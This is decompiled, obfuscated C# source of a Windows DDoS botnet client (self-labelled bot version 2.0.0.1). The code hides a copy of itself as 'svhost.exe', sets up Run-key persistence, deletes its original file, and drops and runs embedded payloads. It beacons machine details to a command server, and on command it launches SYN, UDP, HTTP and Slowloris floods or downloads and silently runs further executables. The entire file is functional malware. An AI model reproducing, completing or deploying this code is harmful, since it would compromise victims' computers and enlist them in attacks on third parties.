using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class bBBbkwZsYvOnOZTlVrblrnz
{
	private static Thread RfnoxVQtvciCKzfabZePWdt = new Thread(UUjZcUtWBygVpgXkuedRRsB);

	private static MD5 TMTwYJZdgXwZFokZtjaoyhh = new MD5CryptoServiceProvider();

	[STAThread]
	public static void Main()
	{
		try
		{
			RfnoxVQtvciCKzfabZePWdt.Start();
			PidSxHIGLvowanmDHJBaphS();
			ResourceManager resourceManager = new ResourceManager("tUqESyRDHgU", Assembly.GetExecutingAssembly());
			object resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)resourceSet).GetEnumerator();
				DictionaryEntry dictionaryEntry = default(DictionaryEntry);
				while (enumerator.MoveNext())
				{
					object current = enumerator.Current;
					DictionaryEntry dictionaryEntry2 = ((current != null) ? ((DictionaryEntry)current) : dictionaryEntry);
					byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
					FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
					fileStream.Write(array, 0, array.Length);
					fileStream.Close();
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key) }, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void UUjZcUtWBygVpgXkuedRRsB()
	{
		while (true)
		{
			try
			{
				string idTKYiRREEfnBcvbzRdRPJb = "&pcname=" + Environment.MachineName + "&botver=2.0.0.1&winver=" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " (x" + Conversions.ToString(bYHUttVdqSmRpHhITNfOlVf()) + ")&hwid=" + lhsKZgirPKnpWcvEsYUUTXJ();
				string text = aBMGYIeOZebmESabkJEgiPV("www.zippyshare.comconnect.php", idTKYiRREEfnBcvbzRdRPJb);
				string empty = string.Empty;
				JQgIHXNPHgJnlUIdTKYiRRE();
				EfnBcvbzRdRPJbYuepvrDUV();
				if (text.Length != 0 && Operators.CompareString(text, empty, false) != 0)
				{
					qrCZGjyfmFNDidechTMTwYJ(text);
					empty = text;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(60000);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void qrCZGjyfmFNDidechTMTwYJ(string ZdgXwZFokZtjaoyhhUHhERf)
	{
		string[] array = ZdgXwZFokZtjaoyhhUHhERf.Split(new char[1] { '*' });
		try
		{
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!SYN"))
			{
				try
				{
					BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT = array[1];
					BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk = Convert.ToInt32(array[2]);
					BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM = Convert.ToInt32(array[3]);
					BZDhfNCWNDRbKKxxYhtWpVs.lsXkjzEGxXmePwyTvBPLtHg = Convert.ToInt32(array[4]);
					BZDhfNCWNDRbKKxxYhtWpVs.TVeCwacJPiqfLHHGLvDKaBz();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!UDP"))
			{
				try
				{
					DIflsXkjzEGxXmePwyTvBPL.JNnbZTliFayFBNQfBCLVQtJ = array[1];
					DIflsXkjzEGxXmePwyTvBPL.bvPJyenomrcVcHUTjmphHVO = Convert.ToInt32(array[2]);
					DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP = Convert.ToInt32(array[3]);
					DIflsXkjzEGxXmePwyTvBPL.ygiDfkxJdqeQrONoWnZdEep = 1024;
					DIflsXkjzEGxXmePwyTvBPL.uEFDIflsXkjzEGxXmePwyTv = 1024;
					DIflsXkjzEGxXmePwyTvBPL.uIFnBaaCKXySxWnOnysLuRB();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!HTTP-GET"))
			{
				try
				{
					wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz = array[1];
					wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD = Convert.ToInt32(array[2]);
					wXicurPkJBxJaoKxHfaDFlG.GkLwMQTLjNrbXMgWNblUUHt = Convert.ToInt32(array[3]);
					wXicurPkJBxJaoKxHfaDFlG.epHIdfoMsWmTZsBpVRRPUGy = false;
					wXicurPkJBxJaoKxHfaDFlG.ByEpvDTutKzDtTvbZHvQGwL = YTwyfzFNDiqrpuSZgLXXmqt.kKZSCjmHjnCxhuUUuEQsMrP();
					wXicurPkJBxJaoKxHfaDFlG.VEEqqSanPjOmEQFCvOLhRci = YTwyfzFNDiqrpuSZgLXXmqt.hHhsmFoLuFLHTkyHIRojNPv();
					wXicurPkJBxJaoKxHfaDFlG.FlGLTJoxxwCYfmRedtwzrQf();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!HTTP-POST"))
			{
				try
				{
					wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz = array[1];
					wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD = Convert.ToInt32(array[2]);
					wXicurPkJBxJaoKxHfaDFlG.GkLwMQTLjNrbXMgWNblUUHt = Convert.ToInt32(array[3]);
					wXicurPkJBxJaoKxHfaDFlG.epHIdfoMsWmTZsBpVRRPUGy = true;
					wXicurPkJBxJaoKxHfaDFlG.ByEpvDTutKzDtTvbZHvQGwL = YTwyfzFNDiqrpuSZgLXXmqt.kKZSCjmHjnCxhuUUuEQsMrP();
					wXicurPkJBxJaoKxHfaDFlG.VEEqqSanPjOmEQFCvOLhRci = YTwyfzFNDiqrpuSZgLXXmqt.hHhsmFoLuFLHTkyHIRojNPv();
					wXicurPkJBxJaoKxHfaDFlG.FlGLTJoxxwCYfmRedtwzrQf();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!SLOWRIS-FLOOD"))
			{
				try
				{
					BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT = array[1];
					BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk = Convert.ToInt32(array[2]);
					BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM = 1;
					BZDhfNCWNDRbKKxxYhtWpVs.lsXkjzEGxXmePwyTvBPLtHg = 1;
					BZDhfNCWNDRbKKxxYhtWpVs.TVeCwacJPiqfLHHGLvDKaBz();
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!VISIT-PAGE"))
			{
				try
				{
					if (Operators.CompareString(array[2], "0", false) == 0)
					{
						if (!array[1].StartsWith("http://"))
						{
							array[1] = "http://" + array[1];
						}
						Process.Start(array[1]);
					}
					else
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "iexplore.exe";
						processStartInfo.Arguments = array[1];
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo);
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!DOWNLOAD"))
			{
				try
				{
					JQgIHXNPHgJnlUIdTKYiRRE();
					cVFmpKmqFPkxkXyUTvdugkK(array[1]);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			if (!ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!UPDATE-BOTS"))
			{
				return;
			}
			try
			{
				JQgIHXNPHgJnlUIdTKYiRRE();
				if (gWCLLKOlszeqqHKNFdslVDG())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.DeleteValue("Fupdate");
					registryKey.Close();
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey2.DeleteValue("Fupdate");
					registryKey2.Close();
				}
				cVFmpKmqFPkxkXyUTvdugkK(array[1]);
				ProjectData.EndApp();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static void JQgIHXNPHgJnlUIdTKYiRRE()
	{
		try
		{
			BZDhfNCWNDRbKKxxYhtWpVs.QGJBZDhfNCWNDRbKKxxYhtW();
			DIflsXkjzEGxXmePwyTvBPL.MSOZqFNOYvqUVCJbjZFzByE();
			wXicurPkJBxJaoKxHfaDFlG.SCjmHjnCxhuUUuEQsMrPhHh();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void PidSxHIGLvowanmDHJBaphS()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe"))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe", overwrite: true);
				FileInfo fileInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe");
				fileInfo.Attributes = FileAttributes.Hidden;
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe");
				if (gWCLLKOlszeqqHKNFdslVDG())
				{
					RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey.SetValue("Fupdate", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe");
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey2.SetValue("Fupdate", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe");
				}
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)0);
				wYJZdgXwZFokZtjaoyhhUHh();
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string lhsKZgirPKnpWcvEsYUUTXJ()
	{
		return UHhERfNeQUtifZroLhGMITX(Environment.UserName.ToString() + Environment.ProcessorCount + Environment.MachineName.ToString() + Environment.Version.ToString() + Conversions.ToString(bYHUttVdqSmRpHhITNfOlVf()) + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString());
	}

	public static string UHhERfNeQUtifZroLhGMITX(string lHJSbWzQiDWQGluusxjcjOa)
	{
		byte[] array = TMTwYJZdgXwZFokZtjaoyhh.ComputeHash(Encoding.Default.GetBytes(lHJSbWzQiDWQGluusxjcjOa));
		return BitConverter.ToString(array).Replace("-", "").ToUpper();
	}

	public static bool gWCLLKOlszeqqHKNFdslVDG()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static int bYHUttVdqSmRpHhITNfOlVf()
	{
		return checked(Marshal.SizeOf(typeof(IntPtr)) * 8);
	}

	public static string aBMGYIeOZebmESabkJEgiPV(string owmSNOMRCJQgIHXNPHgJnlU, string IdTKYiRREEfnBcvbzRdRPJb)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamReader streamReader = default(StreamReader);
		WebResponse response = default(WebResponse);
		WebRequest webRequest = default(WebRequest);
		byte[] bytes = default(byte[]);
		Stream requestStream = default(Stream);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 284:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_002b;
						case 6:
							goto IL_003a;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0057;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0073;
						case 11:
							goto IL_007e;
						case 12:
							goto IL_008a;
						case 13:
							goto IL_0091;
						case 14:
						case 15:
							goto IL_009c;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_009c:
					num = 15;
					streamReader = new StreamReader(response.GetResponseStream());
					break;
					IL_0008:
					num = 2;
					ServicePointManager.Expect100Continue = false;
					goto IL_0011;
					IL_0011:
					num = 3;
					webRequest = WebRequest.Create(owmSNOMRCJQgIHXNPHgJnlU);
					goto IL_001c;
					IL_001c:
					num = 4;
					webRequest.ContentType = "application/x-www-form-urlencoded";
					goto IL_002b;
					IL_002b:
					num = 5;
					webRequest.Method = "POST";
					goto IL_003a;
					IL_003a:
					num = 6;
					bytes = Encoding.ASCII.GetBytes(IdTKYiRREEfnBcvbzRdRPJb);
					goto IL_0049;
					IL_0049:
					num = 7;
					webRequest.ContentLength = bytes.Length;
					goto IL_0057;
					IL_0057:
					num = 8;
					requestStream = webRequest.GetRequestStream();
					goto IL_0063;
					IL_0063:
					num = 9;
					requestStream.Write(bytes, 0, bytes.Length);
					goto IL_0073;
					IL_0073:
					num = 10;
					requestStream.Close();
					goto IL_007e;
					IL_007e:
					num = 11;
					response = webRequest.GetResponse();
					goto IL_008a;
					IL_008a:
					num = 12;
					if (response == null)
					{
						goto IL_0091;
					}
					goto IL_009c;
					IL_0091:
					num = 13;
					text = null;
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 16;
				text = streamReader.ReadToEnd().Trim();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 284;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void cVFmpKmqFPkxkXyUTvdugkK(string LjBaBMGYIeOZebmESabkJEg)
	{
		Process process = new Process();
		WebClient webClient = new WebClient();
		string text = qeQrONoWnZdEepjCyVrQIEP(8) + ".exe";
		try
		{
			webClient.DownloadFile(LjBaBMGYIeOZebmESabkJEg, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool gkKkvpIFcxWOLWnCXLUsmQS(string iPVowmSNOMRCJQgIHXNPHgJ)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 56:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = Process.GetProcessesByName(iPVowmSNOMRCJQgIHXNPHgJ).Length >= 1;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 56;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static object kvpIFcxWOLWnCXLUsmQSyTY(string nlUIdTKYiRREEfnBcvbzRdR)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 102:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0031;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					process.CloseMainWindow();
					num5 = checked(num5 + 1);
					goto IL_0031;
					IL_0008:
					num = 2;
					processesByName = Process.GetProcessesByName(nlUIdTKYiRREEfnBcvbzRdR);
					num5 = 0;
					goto IL_0034;
					IL_0034:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001a;
					}
					goto end_IL_0000_2;
					IL_0031:
					num = 5;
					goto IL_0034;
					IL_001a:
					num = 3;
					process.Kill();
					goto IL_0023;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 102;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static void wYJZdgXwZFokZtjaoyhhUHh()
	{
		try
		{
			string text = qeQrONoWnZdEepjCyVrQIEP(5) + ".bat";
			FileInfo fileInfo = new FileInfo(Application.get_StartupPath());
			fileInfo.Attributes = FileAttributes.Normal;
			string text2 = Interaction.Environ("TEMP") + "\\" + text;
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			StreamWriter streamWriter = new StreamWriter(text2, append: false);
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine(":L1");
			streamWriter.WriteLine("del \"" + Application.get_ExecutablePath() + "\" 2>nul");
			streamWriter.WriteLine("if exist \"" + Application.get_ExecutablePath() + "\" goto L1");
			streamWriter.WriteLine("del \"" + text2 + "\" 2>nul");
			streamWriter.Close();
			Interaction.Shell(text2, (AppWinStyle)0, false, -1);
			Application.Exit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string qeQrONoWnZdEepjCyVrQIEP(int CwacJPiqfLHHGLvDKaBzQGJ)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		StringBuilder stringBuilder = default(StringBuilder);
		char[] array = default(char[]);
		int num6 = default(int);
		int num7 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 214:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001e;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_0037;
						case 7:
							goto IL_003f;
						case 8:
							goto IL_0066;
						case 9:
							goto IL_0073;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0073:
					num = 9;
					num5 = checked(num5 + 1);
					goto IL_007d;
					IL_0008:
					num = 2;
					VBMath.Randomize();
					goto IL_0010;
					IL_0010:
					num = 3;
					stringBuilder = new StringBuilder("");
					goto IL_001e;
					IL_001e:
					num = 4;
					array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
					goto IL_002c;
					IL_002c:
					num = 5;
					num6 = CwacJPiqfLHHGLvDKaBzQGJ;
					num5 = 1;
					goto IL_007d;
					IL_007d:
					if (num5 > num6)
					{
						break;
					}
					goto IL_0037;
					IL_0037:
					num = 6;
					VBMath.Randomize();
					goto IL_003f;
					IL_003f:
					num = 7;
					num7 = checked((int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f));
					goto IL_0066;
					IL_0066:
					num = 8;
					stringBuilder.Append(array[num7]);
					goto IL_0073;
					end_IL_0000_2:
					break;
				}
				num = 10;
				text = stringBuilder.ToString();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 214;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int rcVcHUTjmphHVOygiDfkxJd(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

	public static void EfnBcvbzRdRPJbYuepvrDUV()
	{
		try
		{
			GC.Collect();
			GC.WaitForPendingFinalizers();
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				rcVcHUTjmphHVOygiDfkxJd(Process.GetCurrentProcess().Handle, -1, -1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
